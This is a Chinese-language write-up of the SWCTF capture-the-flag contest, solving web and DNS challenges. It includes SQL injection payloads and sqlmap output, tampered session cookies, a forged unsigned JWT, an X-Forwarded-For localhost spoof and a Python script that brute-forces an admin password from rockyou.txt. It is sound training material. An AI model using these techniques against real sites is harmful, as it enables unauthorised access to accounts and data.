# SWCTF

## hackmd
> https://hackmd.io/@entroy/SkO-rwl0v

## Table of Contents
* [scoreboard](#scoreboard)
* [write up](#write-up)
* [web](#web)
    * [逢甲 - Web](#逢甲---Web)
        * [CoolMD](#CoolMD)
        * [Evil Robots](#Evil-Robots)
        * [Google It Yourself](#Google-It-Yourself)
        * [Notifications](#Notifications)
        * [Stupid Session](#Stupid-Session)
        * [Stupid Session Revenge](#Stupid-Session-Revenge)
    * [靜宜 - Web](#靜宜---Web)
        * [🐘](#🐘)
        * [Git](#Git)
        * [My first SQL Injection](#My-first-SQL-Injection)
        * [Advanced SQL Injection](#Advanced-SQL-Injection)
    * [中科 - Web](#中科---Web)
        * [admin](#admin)
* [Misc](#Misc)
    * [逢甲 - Misc](#逢甲---Misc)
        * [Real Google](#Real-Google)

## scoreboard
![](https://i.imgur.com/hgvtHdQ.png)
![](https://i.imgur.com/w7ON3ZM.png)

## write up
> reverse 沒有 我不會 ╮(╯_╰)╭
> misc 跟 crypto 有解一些，不過實在懶得再解一次 (oﾟ▽ﾟ)
> web 破台 ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡

## web

### 逢甲 - Web

#### CoolMD
> 200
> 作筆記再也不用煩惱太單調了
> https://hackmd.io/@swctf/CoolMD/
* 在 source code 裡面
* flag : `SWCTF{coOL_CSsY_Cha7_r0om}`

#### Evil Robots
> 200
> 機器人什麼都拿，要是連 flag 都被拿走那怎麼辦？
> http://swctf.hackersir.org:20200/
* 機器人 \\(\rightarrow\\) `robots.txt`
    ```txt=
    User-agent: *
    Disallow: /nguinwiuniueniuw/hawuohudsoihfifiofs.php
    ```
* 訪問一下就有 flag 了
* flag : `SWCTF{d0nt_iNDex_7HE_Fl46}`

#### Google It Yourself
> 200
> 如果有 Google 不到的問題，那就再多 Google 幾次
> http://swctf.hackersir.org:20201/
* 很有趣的題目，可以很明顯的發現點進去之後，網址不是一樣的，可以推測被 header location 301 了
* 所以用 curl 看一下，`curl http://swctf.hackersir.org:20201/ -v`，就可以看到 flag 了
* flag : `SWCTF{G0ogle_It_YoUr53Lf}`

#### Notifications
> 200
> 出題者喜歡吃什麼? 猜對了就給 flag
> https://swctf.hackersir.org:20202/
> 本題請允許網站顯示通知，以獲得完整體驗
* 純 JS 題
* 找一下就有 flag 了 
* https://swctf.hackersir.org:20202/thirdparty/sw.js
* flag : `SWCTF{SeRVICE_woRker_n3w_SubsCRiber}`

#### Stupid Session
> 200
> 好想當管理員，但只有測試帳號能用 ...
> http://swctf.hackersir.org:20203/
> 測試帳密：test : test
* 用 test : test 登入
* 查看 cookies，有一個 login_info，用 urldecode 一下 `a:1:{s:8:"username";s:4:"test";}`
* 改成 `a:1:{s:8:"username";s:5:"admin";}` 之後 urlencode 一下，把原本 login_info 的資訊改一下，就可以拿到 flag 了
* flag : `SWCTF{C00K1eS_aR3_very_u53FuL}`

#### Stupid Session Revenge
> 200
> 管理員學聰明了，改用了先進的技術來保護他的網站
> http://swctf.hackersir.org:20204/
> 測試帳密：test : test
* 用 test : test 登入
* 查看 cookies，`login_info=eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InRlc3QifQ.`
* 明顯是 jwt，用 jwt_tools 把 username 改掉就可以了 `login_info=eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.`
* flag : `SWCTF{the_B3GiniN9_of_jWt}`

### 靜宜 - Web

#### 🐘
> 200
> PHP is the best language in the world
> http://swctf.hackersir.org:20003/
* `substr(md5("CMRDB" . "Your Answer"), 0, 6) == md5("s1885207154a")`
* md5 碰撞
* 直接跑腳本
    ```php=
    <?php
        for ($i = 0; $i < 999999999; $i ++) {
            if (substr(md5("CMRDB" . $i), 0, 6) == md5("s1885207154a")) {
                print_r($i);
                break;
            }
        }
    ?>
    ```
* 結果是 `213`
* flag : `SWCTF{n0w_u_kn0w_wh@t_15_md5}`

#### Git
> 200
> 小明為了學習網頁安全，正在學習如何撰寫網頁，並且使用工程師必備工具 git 做版本控管。
> http://swctf.hackersir.org:20001/
* 明顯考 git 洩漏
* 用 githack 拿到 .git file，之後用 `git log -p` 看一下
* flag : `SWCTF{g1t_13ak_15_easy}`

#### My first SQL Injection
> 200
> 小明想成為跟 TIM 哥一樣厲害的駭客(?
> 正在自學資訊安全，研究完 SQL Injection 後想要小試身手
> http://swctf.hackersir.org:20002/
* 啊 ... sql injection
* source code
    ```php=
    <?php
    include('flag.php');

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    if (isset($_GET['account']) && isset($_GET['password'])) {
        $account = $_GET['account'];
        $password = md5($_GET['password']);   
    }

    $not_good = [' ', 'or', 'and', '--', '#', '/*', '*/'];
    $account = str_ireplace($not_good, '', $account);

    $row = (new SQLite3('/db.sqlite3'))
        ->querySingle("SELECT * FROM users WHERE account = '$account' AND password = '$password'", true);
    if ($row) {
        echo $flag;
    } else {
        highlight_file(__FILE__);
    }
    ```
* 有 waf 過濾掉一些東西
* payload : `http://swctf.hackersir.org:20002/?account=admin%27//**&password=123`
* flag : `SWCTF{t1i5_i5_th3_r3a1_flag}`

#### Advanced SQL Injection
> 200
> 為了跟上 TIM 哥的腳步，小明持續深入研究 SQL Injection，聽說有種手法是利用 Union 作攻擊
> http://swctf.hackersir.org:20000/
* source code
    ```php=
    <?php

    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit();
    }

    if (isset($_GET['action']) && $_GET['action'] == 'logout') {
        setcookie("userinfo", "", time() - 3600);
        die("<script>window.location.replace('/');</script>");
    } else if (isset($_POST['account']) && isset($_POST['password'])) {
        $account = $_POST['account'];
        $password = md5($_POST['password']);

        setcookie("userinfo", json_encode($row), time() + 3600 * 24, "/");

        $row = (new SQLite3('/db.sqlite3'))
            ->querySingle("SELECT * FROM users WHERE account = '$account' AND password = '$password'", true);
        if (!$row) {
            $error = "Login Fail";
        } else {
            setcookie("userinfo", json_encode($row), time() + 3600 * 24, "/");
            die("<script>window.location.replace('/');</script>");
        }
    }
    ```
* 滿明顯可以用 sqlmap 打的 ... 我懶 XDDDD
    ```=
    ---
    Parameter: account (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: account=admin' AND 5275=5275-- ztus&password=admin

        Type: time-based blind
        Title: SQLite > 2.0 AND time-based blind (heavy query)
        Payload: account=admin' AND 1204=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- lsAs&password=admin

        Type: UNION query
        Title: Generic UNION query (NULL) - 4 columns
        Payload: account=-4386' UNION ALL SELECT 'qvqkq'||'OFqUpiAtsLJGifUwtFLnNBcerOhXNTomXQGOxZnB'||'qpbjq',NULL,NULL,NULL-- wMXq&password=admin
    ---
    ```
* db
    ```=
    SQLite
    ```
* tables
    ```=
    +-----------------+
    | flag            |
    | sqlite_sequence |
    | users           |
    +-----------------+
    ```
* flag
    ```=
    +----+----------------------------------------+
    | id | flag                                   |
    +----+----------------------------------------+
    | 1  | you are close                          |
    | 2  | you are more closer                    |
    | 3  | almost there                           |
    | 4  | SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag} |
    +----+----------------------------------------+
    ```
* flag : `SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag}`

### 中科 - Web

#### admin
> 499
> Only admin can visit this page.
> http://swctf.hackersir.org:20100/
* 一開始訪問的話會跟你說 forbidden
* 想說也沒有被重新導向，這樣的話說不定是會查是不是 localhost 訪問之類的，所以設定一下 header `x-forwarded-for: 127.0.0.1`
* 之後就會出現一個輸入匡，username 的話是 admin，密碼的話我稍微用 sqlmap 打了一下，發現不行，所以認為是弱密碼
* 之後寫了一個腳本跑一下
    ```python=
    import requests

    s = requests.Session()
    set_header = {'x-forwarded-for' : '127.0.0.1'}
    url = 'http://swctf.hackersir.org:20100/'

    def send_request():
        f = open('/usr/share/wordlists/rockyou.txt')

        while True:
            password = f.readline().replace('\n', '')
            data = {
                'user' : 'admin',
                'pass' : password
            }

            result = s.post(url, headers=set_header, data=data).text
            if 'error' not in result:
                print(result)
                break
            else:
                print(password)

    if __name__ == '__main__':
        send_request()
    ```
* 密碼是 `rockyou`
* flag : `SWCTF{4R3_Y0U_4_R34L_4DM1N?}`

## Misc

### 逢甲 - Misc

#### Real Google
> 488
> 這個網域應該是真的 Google，在上面輸入帳號密碼應該沒問題。可惜似乎連不上 ...
> thisisrealgoogle.tw
* 滿有意思的，用 dig 瘋狂挖資料就可以拿到 flag 了
* payload : `dig thisisrealgoogle.tw sshfp`
* flag : `SWCTF{D1G_iNT0_THE_dNS}`